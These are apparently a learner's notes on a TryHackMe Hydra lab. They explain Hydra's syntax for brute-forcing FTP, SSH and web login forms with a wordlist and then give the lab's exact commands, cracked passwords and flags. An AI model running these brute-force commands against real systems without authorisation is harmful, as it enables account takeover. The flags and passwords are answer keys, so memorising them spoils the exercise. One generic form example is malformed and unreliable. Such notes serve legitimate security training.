# Hydra #

# Hydra Intorduction #

Hydra is used to crack online bruteforse password

FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP

# Using Hydra #
```
ftp : hydra -l <user> -P <pass_list> <machine_link>

ssh : hydra -l <username> -P <full_path_to_pass> MACHINE_IP -t 4 ssh
```
options:
| Switch | Description |
|------|--------|
| -l | for username |
| -P | for password files |
| -t | for threads to use |


for using hydra into the post web form 

```
hydra -l <username> -P <wordlist> <MACHINE_IP> http-post-form "/:username=^USER^& password=^PASS&:F=incorrect" -v
```
| Options | Description |
|---------|-------------|
| -l      | single username |
| -P (Capital) | password list |
| http-post-form | the type of post forms |
| /<login_url> | the login page url |
| :username | the form field where username is entered |
| ^USER^ | tells hydra to use the username |
| password | the form filed where password is entered |
| ^PASS^ | tell hydra to use the password list value one by one |
| login | indicates to hydra the login failed message |
| login failed | is the login failure message the form return |
| F=incorrect | if this word appears on the page, its incorrect |
| -v | verbose output for every attempt |


Use Hydra to bruteforce molly's web password. What is flag 1 ?
 : cmd => hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.225.173 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 : password = sunshine and username = molly
 : flag => THM{2673a7dd116de68e85c48ec0b1f2612e}
  
Use Hydra to bruteforce molly's SSH password. What is the flag ?
  : cmd => hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.225.173 -t 4 ssh
  : ssh cmd => ssh molly@10.10.225.173 
  : ssh password => butterfly
  :flag => THM{c8eeb0468febbadea859baeb33b2541b}
  
=== THE END === 
